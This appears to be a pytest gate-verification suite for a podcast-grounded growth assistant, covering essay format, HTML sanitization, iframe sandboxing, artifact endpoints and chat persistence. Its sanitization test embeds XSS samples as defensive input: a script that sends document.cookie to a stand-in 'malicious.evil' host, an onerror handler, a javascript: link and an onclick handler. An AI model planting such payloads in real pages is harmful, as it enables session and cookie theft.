"""
Lenny Growth Assistant — Phase 9 Gate Verification Test Suite

Proves all 5 Phase 9 Definition of Done criteria from CODING_AGENT_TUTOR.md:
1. Ship 30 Content Engine produces ~1,250 words with opening hook, short paragraphs,
   bold anchors, section headers, in-text citations, and 5-step playbook.
2. Artifact Service validates and cleanses HTML artifacts using bleach defense-in-depth,
   stripping scripts, event handlers, and javascript: links while preserving styles.
3. Frontend safe sandbox contract enforces sandbox="allow-scripts" without allow-same-origin.
4. Database persistence and REST API endpoints (GET /api/artifacts/{id},
   GET /api/artifacts/{id}/download, GET /api/artifacts/session/{session_id}) work end-to-end.
5. Chat Service in Ship 30 / artifact mode automatically persists safe deliverables.
"""

import json
import re
import uuid
import pytest
import pytest_asyncio
import httpx
from httpx import ASGITransport
from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker, create_async_engine
from sqlalchemy.pool import NullPool

from app.core.config import settings
from app.db.models import Episode, TranscriptChunk, User, Session, Message, Artifact
from app.db.session import get_db
from app.main import app
from app.services.artifact_service import ArtifactService
from app.services.chat_service import ChatService
from app.agent.skills import (
    generate_mock_ship30_essay,
    SHIP30_SYSTEM_PROMPT,
)
from app.agent.client import PiAgentClient
from app.agent.models import AgentRequestPayload, AgentSkill
from app.retrieval.models import EvidenceChunk
from app.schemas.chat import ChatRequest


@pytest_asyncio.fixture
async def phase9_gate_fixture():
    """Sets up an isolated test database session and ASGI client."""
    test_engine = create_async_engine(settings.DATABASE_URL, poolclass=NullPool)
    session_factory = async_sessionmaker(
        bind=test_engine,
        class_=AsyncSession,
        expire_on_commit=False,
        autoflush=False,
    )

    async with session_factory() as session:
        # Create unique user and session
        anon_id = f"anon_gate9_{uuid.uuid4().hex[:12]}"
        user = User(anonymous_identifier=anon_id)
        session.add(user)
        await session.flush()

        db_session = Session(
            user_id=user.id,
            title="Phase 9 Gate Verification Session",
        )
        session.add(db_session)

        # Seed sample episode and chunk for citation retrieval
        episode_id = uuid.uuid4()
        episode = Episode(
            id=episode_id,
            title="Rahul Vohra: Superhuman's Product-Market Fit Engine",
            guest_name="Rahul Vohra",
            source_url="https://www.lennyspodcast.com/rahul-vohra/",
            metadata_={"episode_number": 12},
        )
        session.add(episode)

        chunk_content = (
            "We surveyed Superhuman users with the Sean Ellis question: 'How would you feel "
            "if you could no longer use Superhuman?' If 40% answer very disappointed, you have PMF."
        )
        chunk = TranscriptChunk(
            id=uuid.uuid4(),
            episode_id=episode_id,
            chunk_index=0,
            content=chunk_content,
            start_timestamp="00:14:22",
            end_timestamp="00:16:00",
            token_count=len(chunk_content.split()),
            content_hash=f"gate9_hash_{uuid.uuid4().hex[:32]}",
            embedding=[0.05] * 1536,
            metadata_={"guest": "Rahul Vohra"},
        )
        session.add(chunk)
        await session.commit()

        async def override_get_db():
            yield session

        app.dependency_overrides[get_db] = override_get_db
        transport = ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
            yield client, session, user, db_session, chunk

        app.dependency_overrides.clear()


@pytest.mark.asyncio
async def test_gate_1_ship30_content_engine_heuristics(phase9_gate_fixture):
    """
    Gate 1: Verifies the Ship 30 Content Engine produces ~1,250 words
    adhering strictly to all editorial heuristics:
    - Opening hook without fluff
    - Short paragraphs (1-3 sentences)
    - Bold anchors on every bullet point
    - Section headers (## and ###)
    - In-text citations [Episode: Guest, Timestamp]
    - 5-step implementation playbook
    """
    client, db, user, session_obj, chunk = phase9_gate_fixture

    evidence = [
        {
            "chunk_id": str(chunk.id),
            "episode_title": "Rahul Vohra: Superhuman PMF Engine",
            "guest_name": "Rahul Vohra",
            "timestamp": "14:22",
            "content": chunk.content,
        }
    ]

    essay = generate_mock_ship30_essay(
        topic="Product-Led Growth vs Sales-Led Growth",
        evidence=evidence,
    )

    words = essay.split()
    word_count = len(words)

    # 1. Word count target (~1,250 words, comfortably within 1,000–1,500)
    assert 1000 <= word_count <= 1500, f"Expected ~1,250 words, got {word_count}"

    # 2. Opening hook (no throat-clearing fluff)
    first_line = essay.strip().split("\n")[0]
    forbidden_starters = ["in this essay", "today we explore", "let's dive into", "welcome to"]
    for forbidden in forbidden_starters:
        assert forbidden not in first_line.lower(), f"Found filler phrase '{forbidden}' in opening hook"

    # 3. Bold anchors on bullet points
    bullet_anchors = re.findall(r"^\*\s+\*\*([^*]+)\*\*\s+", essay, flags=re.MULTILINE)
    assert len(bullet_anchors) >= 4, f"Expected at least 4 bullet points with bold anchors, got {len(bullet_anchors)}"
    for anchor in bullet_anchors:
        assert len(anchor) > 3, f"Bold anchor '{anchor}' too short"

    # 4. Section headers
    h2_matches = re.findall(r"^##\s+(.+)$", essay, flags=re.MULTILINE)
    assert len(h2_matches) >= 3, f"Expected at least 3 ## headers, got {len(h2_matches)}"

    # 5. In-text citations
    citations = re.findall(r"\[(.*?):\s*([^,\]]+),\s*(\d{1,2}:\d{2})\]", essay)
    assert len(citations) >= 3, f"Expected at least 3 citations, got {len(citations)}"
    assert any("Rahul Vohra" in c[0] or "Rahul Vohra" in c[1] for c in citations), "Expected custom evidence citation for Rahul Vohra"

    # 6. Actionable 5-step playbook
    numbered_steps = re.findall(r"^\d+\.\s+\*\*([^*]+)\*\*[:\s]+(.+)$", essay, flags=re.MULTILINE)
    assert len(numbered_steps) >= 5, f"Expected 5-step playbook, got {len(numbered_steps)}"

    # 7. Streaming token emission through PiAgentClient
    evidence_chunk = EvidenceChunk(
        chunk_id=chunk.id,
        episode_title="Rahul Vohra: Superhuman PMF Engine",
        guest_name="Rahul Vohra",
        content=chunk.content,
        timestamp="14:22",
        similarity=0.88,
    )
    pi_client = PiAgentClient()
    payload = AgentRequestPayload(
        skill=AgentSkill.SHIP30_WRITER,
        query="Explain PMF and PLG",
        evidence=[evidence_chunk],
        mock_mode=True,
    )
    tokens = []
    async for event in pi_client.stream_skill(payload):
        if event.event == "token":
            tokens.append(event.data.get("delta", ""))

    streamed_text = "".join(tokens)
    assert len(streamed_text.split()) >= 1000
    assert "Rahul Vohra" in streamed_text


@pytest.mark.asyncio
async def test_gate_2_bleach_sanitization_defense_in_depth():
    """
    Gate 2: Verifies Bleach defense-in-depth sanitization strips dangerous
    scripts, inline event handlers, and pseudo-protocols while preserving styles.
    """
    dangerous_html = """
    <!DOCTYPE html>
    <html>
      <head>
        <title>Dangerous Artifact</title>
        <style>
          .card { background: #1e293b; padding: 20px; border-radius: 8px; color: white; }
          .highlight { color: #10b981; font-weight: bold; }
        </style>
      </head>
      <body>
        <div class="card">
          <h1>Product Growth Metrics</h1>
          <p class="highlight">Grounded in Lenny's Podcast archive.</p>
          <script>
            // Malicious script payload
            fetch('https://malicious.evil/steal?c=' + document.cookie);
          </script>
          <img src="x" onerror="alert('xss_injection');" />
          <a href="javascript:alert('pwned');">Click for secret growth hack</a>
          <button onclick="localStorage.clear();">Clear Session</button>
        </div>
      </body>
    </html>
    """

    sanitized_res = ArtifactService.validate_and_sanitize(
        type="html",
        title="Growth Metrics",
        content=dangerous_html,
    )
    sanitized = sanitized_res["content"]

    # Must strip <script> tag and payload completely
    assert "<script" not in sanitized.lower()
    assert "fetch('https://malicious.evil" not in sanitized
    assert "steal?c=" not in sanitized

    # Must strip active event handlers
    assert "onerror" not in sanitized.lower()
    assert "onclick" not in sanitized.lower()

    # Must strip javascript: pseudo-protocol
    assert "javascript:" not in sanitized.lower()

    # Must preserve valid structure and safe tags
    assert "Product Growth Metrics" in sanitized
    assert "Grounded in Lenny's Podcast archive." in sanitized
    assert "<style>" in sanitized
    assert ".highlight" in sanitized
    assert '<div class="card">' in sanitized


@pytest.mark.asyncio
async def test_gate_3_sandboxed_iframe_security_contract():
    """
    Gate 3: Inspects the frontend SandboxedIframe component to ensure
    sandbox="allow-scripts" strictly OMITS "allow-same-origin".
    """
    import os
    iframe_file = os.path.join(
        os.path.dirname(__file__),
        "../../frontend/src/components/Artifact/SandboxedIframe.tsx",
    )
    assert os.path.exists(iframe_file), "SandboxedIframe.tsx must exist in frontend"

    with open(iframe_file, "r", encoding="utf-8") as f:
        source = f.read()

    # Parse sandbox attribute
    match = re.search(r'sandbox="([^"]*)"', source)
    assert match is not None, "iframe must declare a sandbox attribute"
    sandbox_tokens = match.group(1).strip().split()

    assert "allow-scripts" in sandbox_tokens, "Sandbox must allow scripts for interactive rendering"
    assert "allow-same-origin" not in sandbox_tokens, (
        "SECURITY VIOLATION: allow-same-origin must strictly be omitted so the frame has an opaque origin"
    )
    assert "srcDoc={sanitizedHtml}" in source, "Must use srcDoc for isolated markup"


@pytest.mark.asyncio
async def test_gate_4_database_persistence_and_rest_endpoints(phase9_gate_fixture):
    """
    Gate 4: Proves artifact database persistence, retrieval, listing,
    and download packaging via REST endpoints.
    """
    client, db, user, session_obj, _ = phase9_gate_fixture

    # 1. Create and persist an artifact in the database
    raw_html = (
        "<div class='plg-card'><h2>Elena Verna PLG Model</h2>"
        "<p>Growth loops compound virality.</p>"
        "<script>alert('strip_me');</script></div>"
    )
    clean_res = ArtifactService.validate_and_sanitize(
        type="html",
        title="Elena Verna PLG Model",
        content=raw_html,
    )
    clean_html = clean_res["content"]

    artifact = Artifact(
        id=uuid.uuid4(),
        session_id=session_obj.id,
        type="html",
        title="Elena Verna PLG Model",
        content=clean_html,
    )
    db.add(artifact)
    await db.commit()

    # 2. GET /api/artifacts/{id}
    res = await client.get(f"/api/artifacts/{artifact.id}")
    assert res.status_code == 200
    data = res.json()
    assert data["id"] == str(artifact.id)
    assert data["type"] == "html"
    assert data["title"] == "Elena Verna PLG Model"
    assert "<script" not in data["content"]
    assert "Elena Verna PLG Model" in data["content"]

    # 3. GET /api/artifacts/{id}/download
    dl_res = await client.get(f"/api/artifacts/{artifact.id}/download")
    assert dl_res.status_code == 200
    assert "text/html" in dl_res.headers["content-type"]
    assert 'attachment; filename="elena_verna_plg_model.html"' in dl_res.headers["content-disposition"]
    assert "Elena Verna PLG Model" in dl_res.text

    # 4. GET /api/artifacts/session/{session_id}
    list_res = await client.get(f"/api/artifacts/session/{session_obj.id}")
    assert list_res.status_code == 200
    artifacts_list = list_res.json()
    assert len(artifacts_list) == 1
    assert artifacts_list[0]["id"] == str(artifact.id)

    # 5. Non-existent artifact 404 envelope
    missing_id = uuid.uuid4()
    err_res = await client.get(f"/api/artifacts/{missing_id}")
    assert err_res.status_code == 404
    err_data = err_res.json()
    assert err_data["error"]["code"] == "ARTIFACT_NOT_FOUND"


@pytest.mark.asyncio
async def test_gate_5_chat_service_creates_persisted_artifact(phase9_gate_fixture):
    """
    Gate 5: Verifies that executing ChatService in Ship 30 mode
    generates, sanitizes, and persists an artifact to the database.
    """
    client, db, user, session_obj, chunk = phase9_gate_fixture

    chat_service = ChatService(db=db)

    events = []
    chat_request = ChatRequest(
        session_id=session_obj.id,
        message="Write a Ship 30 essay on product-led growth retention",
        provider="openai",
        model="gpt-4o-mini",
        mode="ship30",
        mock_mode=True,
    )
    async for sse_event in chat_service.stream_chat(chat_request):
        events.append(sse_event)

    # Parse artifact events from raw SSE text chunks
    artifact_events = []
    for raw in events:
        for block in raw.strip().split("\n\n"):
            if not block.strip():
                continue
            lines = block.split("\n")
            ev_name = None
            ev_data = None
            for line in lines:
                if line.startswith("event: "):
                    ev_name = line[len("event: "):].strip()
                elif line.startswith("data: "):
                    data_str = line[len("data: "):].strip()
                    try:
                        ev_data = json.loads(data_str)
                    except Exception:
                        ev_data = data_str
            if ev_name == "artifact" and isinstance(ev_data, dict):
                artifact_events.append(ev_data)

    assert len(artifact_events) >= 1, "Expected at least one artifact event in ship30 mode"

    artifact_data = artifact_events[0]
    assert "id" in artifact_data
    assert artifact_data["type"] == "markdown"
    assert "content" in artifact_data

    # Verify persisted in database
    art_svc = ArtifactService(db)
    db_artifact = await art_svc.get_artifact(uuid.UUID(artifact_data["id"]))
    assert db_artifact is not None
    assert db_artifact.session_id == session_obj.id
    assert db_artifact.type == "markdown"
    assert len(db_artifact.content.split()) >= 1000
